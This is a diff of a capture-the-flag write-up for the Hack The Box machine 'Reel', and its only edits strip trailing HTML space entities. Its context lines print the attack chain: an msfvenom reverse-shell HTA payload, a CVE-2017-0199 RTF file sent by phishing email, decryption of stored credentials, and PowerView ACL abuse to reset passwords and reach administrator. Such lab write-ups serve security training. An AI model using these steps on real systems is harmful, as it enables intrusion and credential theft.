@@ -21,7 +21,7 @@ PORT      STATE SERVICE
 49159/tcp open  unknown
 ```
 
-Interesting ports that are open, as both SMTP and FTP are present.&#x20;
+Interesting ports that are open, as both SMTP and FTP are present.
 
 ### FTP Anonymous Login
 
@@ -89,11 +89,11 @@ Zip File Name                   : [Content_Types].xml
 Creator                         : nico@megabank.com
 ```
 
-We have one email here, and it's likely that we need to send our RTF file to `nico`.&#x20;
+We have one email here, and it's likely that we need to send our RTF file to `nico`.
 
 ### CVE-2017-0199 RTF Exploit
 
-This box is quite old and came out back in 2018, so any public exploits used will have to come from around that time. I googled for 'RTF CVE Exploits', and found quite a few. There was one in 2023, but obviously it isn't the intended attack vector.&#x20;
+This box is quite old and came out back in 2018, so any public exploits used will have to come from around that time. I googled for 'RTF CVE Exploits', and found quite a few. There was one in 2023, but obviously it isn't the intended attack vector.
 
 I came across this article detailing about an RCE exploit in Microsoft Office using RTF files:
 
@@ -103,7 +103,7 @@ Googling for PoCs for this exploit leads me to this somewhat popular repository:
 
 {% embed url="https://github.com/bhdresh/CVE-2017-0199" %}
 
-Following the instructions, we can first generate a payload using `msfvenom`. Earlier, we saw that AppLocker is in place for most executables and scripts, and this exploit allows multiple other methods of getting RCE, such as generating a `hta` file.&#x20;
+Following the instructions, we can first generate a payload using `msfvenom`. Earlier, we saw that AppLocker is in place for most executables and scripts, and this exploit allows multiple other methods of getting RCE, such as generating a `hta` file.
 
 ```
 $ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.42 lport=443 -f hta-psh > shell.hta
@@ -123,7 +123,7 @@ Generating obfuscated RTF file.
 Generated obfuscated Invoice.rtf successfull
 ```
 
-Afterwards, we just need to use `sendEmail` with the file attached.&#x20;
+Afterwards, we just need to use `sendEmail` with the file attached.
 
 ```
 $ sendEmail -f user@megabank.com -t nico@megabank.com -u "Invoice" -a Invoice.rtf -s 10.129.76.206
@@ -183,7 +183,7 @@ type cred.xml
 ```
 {% endcode %}
 
-Since this is a Powershell generated XML file, we can use the `Import-Clixml` cmdlet to decode it.&#x20;
+Since this is a Powershell generated XML file, we can use the `Import-Clixml` cmdlet to decode it.
 
 ```powershell
 C:\Users\nico\Desktop>powershell -c "$credentials = Import-Clixml -Path cred.xml; $credentials.GetNetworkCredential().password"
@@ -191,7 +191,7 @@ powershell -c "$credentials = Import-Clixml -Path cred.xml; $credentials.GetNetw
 1ts-mag1c!!!
 ```
 
-Using this password, we can `ssh` in as `tom`.&#x20;
+Using this password, we can `ssh` in as `tom`.
 
 <figure><img src="../../../.gitbook/assets/image (1277).png" alt=""><figcaption></figcaption></figure>
 
@@ -271,7 +271,7 @@ I found that our current user has WriteOwner permissions over the user `claire`.
 
 <figure><img src="../../../.gitbook/assets/image (4037).png" alt=""><figcaption></figcaption></figure>
 
-This would mean that `tom` can add permissions over `claire`, of which we don't have any yet. To abuse this, we first need to set `tom` as the owner of the ACLs over `claire` using PowerView.&#x20;
+This would mean that `tom` can add permissions over `claire`, of which we don't have any yet. To abuse this, we first need to set `tom` as the owner of the ACLs over `claire` using PowerView.
 
 Oddly, there's a copy of PowerView on the machine already:
 
@@ -297,7 +297,7 @@ $cred = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
 Set-DomainUserPassword -identity claire -accountpassword $cred                                 
 ```
 
-Afterwards, we can `ssh` in as `claire` using this password.&#x20;
+Afterwards, we can `ssh` in as `claire` using this password.
 
 <figure><img src="../../../.gitbook/assets/image (3812).png" alt=""><figcaption></figcaption></figure>
 
@@ -338,7 +338,7 @@ Checking back on the Bloodhound output, we see that `claire` has WriteDacl permi
 
 <figure><img src="../../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>
 
-This means that the user `claire` can modify the ACLs of the group, which includes adding and removing users.&#x20;
+This means that the user `claire` can modify the ACLs of the group, which includes adding and removing users.
 
 ```
 claire@REEL C:\Users\claire>net group Backup_Admins claire /add /domain                      
@@ -410,4 +410,4 @@ We can then login as the administrator user:
 
 <figure><img src="../../../.gitbook/assets/image (1875).png" alt=""><figcaption></figcaption></figure>
 
-Rooted!&#x20;
+Rooted!
